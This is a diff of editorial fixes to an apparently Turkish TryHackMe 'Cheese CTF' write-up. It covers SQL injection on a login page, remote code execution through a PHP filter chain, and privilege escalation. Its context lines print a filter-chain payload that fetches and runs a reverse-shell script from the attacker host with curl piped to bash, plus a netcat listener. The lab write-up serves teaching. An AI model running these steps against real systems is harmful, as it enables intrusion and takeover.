@@ -32,11 +32,11 @@ Sayfada dolaşırken bir de login sayfası olduğunu görüyoruz.
 
 ## SQLi
 
-Login sayfası üzerinden SQLi saldırısı yaparak giriş yapmayı deneyelim. Ben bu işlemi BurpSuite üzerinden bir wordlist ile yapmak istedim. BurpSuite uygulamasını açalım. Login sayfasından POST isteğini yakalayalım.
+Login sayfası üzerinden SQLi saldırısı yaparak giriş yapmayı deneyelim. Ben bu işlemi Burp Suite üzerinden bir wordlist ile yapmak istedim. Burp Suite uygulamasını açalım. Login sayfasından POST isteğini yakalayalım.
 <div style="text-align: center;">
   <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sqli.webp' | relative_url }}" width="600" height="400" alt="Burp Suite ile yakalanan login sayfası POST isteği">
 </div>
-Paketi yakaladıktan sonra “Send to Intruder” seçeneğini seçelim. Böylece istediğimiz parametre üzerinde deneme yapabilelim. Intruder üzerinde “username” parametresi üzerinde denemeler yapacağım için username değerini seçip Add butonuna tıklıyorum. Ekran görüntüsündeki sarı işaretli alan. Daha iyi anlayabilirsiniz.  
+Paketi yakaladıktan sonra “Send to Intruder” seçeneğini seçelim. Böylece istediğimiz parametre üzerinde deneme yapabilelim. Intruder üzerinde “username” parametresi üzerinde denemeler yapacağım için username değerini seçip Add butonuna tıklıyorum. Ekran görüntüsünde sarıyla işaretli alana bakarak daha iyi anlayabilirsiniz.  
 <div style="text-align: center;">
   <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/intruder.webp' | relative_url }}" width="600" height="400" alt="Burp Suite Intruder'da username parametresinin işaretlenmesi">
 </div>
@@ -71,7 +71,7 @@ PHP, stream wrapper adı verilen mekanizmalar kullanarak dosyaları ve verileri 
 
 Bizim makinemizde de filter chain dediğimiz yöntemi kullanarak uzaktan kod çalıştırmaya çalışacağız. Bu yöntemi ben [bu](https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/) kaynağı kullanarak gerçekleştirdim.
 
-**Step 1**
+**Adım 1**
 
 Kali makineme  [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git) reposunu kurdum.
 <div class="code-window">
@@ -80,7 +80,7 @@ Kali makineme  [https://github.com/synacktiv/php\_filter\_chain\_generator.git]
 </div>
 
 
-**Step 2**
+**Adım 2**
 
 Kali makinemiz üzerinde “revshell” isimli bir shell oluşturuyoruz.
 <div class="code-window">
@@ -94,7 +94,7 @@ Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çal
 <span class="highlight">nzy@kali$</span> sudo python3 -m http.server 80
 </div>
 
-**Step 3**
+**Adım 3**
 
 Shell’i oluşturup erişilebilir hale getirdikten sonra kurban sistem URL’sine, indirdiğimiz aracı kullanarak filter chain oluşturalım.
 <div class="code-window">
@@ -102,9 +102,9 @@ Shell’i oluşturup erişilebilir hale getirdikten sonra kurban sistem URL’si
 <span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '?= \`curl -s -L 10.9.0.127/revshell|bash\` ?'
 </div>
 
-Bunun çıktısındaki uzun satırları kopyalayalım 5. Adımda bu çıktıları kopyalayacağız.
+Bunun çıktısındaki uzun satırları kopyalayalım, 5. adımda bu çıktıları kopyalayacağız.
 
-**Step 4**
+**Adım 4**
 
 Dinleyicimizi başlatalım.
 <div class="code-window">
@@ -112,14 +112,14 @@ Dinleyicimizi başlatalım.
 <span class="highlight">nzy@kali$</span> nc -lvnp 4444
 </div>
 
-**Step 5**
+**Adım 5**
 
 3\. adımda kopyaladığımız çıktıyı şimdi tarayıcıya yerleştirme vakti. Kırmızıyla işaretli yere kendi çıktımızı yazalım.
 <div style="text-align: center;">
   <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/url.webp' | relative_url }}" width="1000" height="60" alt="PHP filter chain çıktısının tarayıcı URL'sine yerleştirilmesi">
 </div>
 
-**Step 6**
+**Adım 6**
 
 Netcat ile dinlediğiniz terminale dönerek shell’e ulaşabilirsiniz.
 <div style="text-align: center;">
@@ -128,7 +128,7 @@ Netcat ile dinlediğiniz terminale dönerek shell’e ulaşabilirsiniz.
 
 ## Privilege Escalation
 
-Sisteme erişim sağladıktan sonra “comte” kullanıcının home klasörünü erişebildik.
+Sisteme erişim sağladıktan sonra “comte” kullanıcısının home klasörüne erişebildik.
 <div style="text-align: center;">
   <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/comte.webp' | relative_url }}" width="400" height="100" alt="Comte kullanıcısının home dizinindeki dosyaların listelenmesi">
 </div>
@@ -170,7 +170,7 @@ Comte kullanıcısı üzerinden root kullanıcısına erişmek için ilk önceli
 <div style="text-align: center;">
   <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sudo.webp' | relative_url }}" width="600" height="150" alt="sudo -l komutunun comte kullanıcısı için gösterdiği yetkiler">
 </div>
-Burada gördüğümüz dosyalar ile ne yapabileceğimize baktım. Exploit.timer dosyası exploit.server isimli dosyayı triggerlayarak başlatabiliyor. Peki bu exploit.service isimli dosyanın içeriği ne ki bize root yetkisi kazandırabilsin?
+Burada gördüğümüz dosyalar ile ne yapabileceğimize baktım. Exploit.timer dosyası exploit.service isimli dosyayı triggerlayarak başlatabiliyor. Peki bu exploit.service isimli dosyanın içeriği ne ki bize root yetkisi kazandırabilsin?
 
 <div class="code-window">
 <br>
@@ -230,7 +230,7 @@ Bir ikili dosyayı veya metni hex formatta gösteren bir komuttur. -r parametres
 
 ### SUID
 
-Normalde bir program çalıştığında, o anki kullanıcının yetkilerine sahiptir fakat program SUID bite sahipse çalıştırıldığında sahibinin yetkileri ile çalışır.
+Normalde bir program çalıştığında, o anki kullanıcının yetkilerine sahiptir fakat program SUID bitine sahipse çalıştırıldığında sahibinin yetkileri ile çalışır.
 
 <div class="code-window">
 <br>
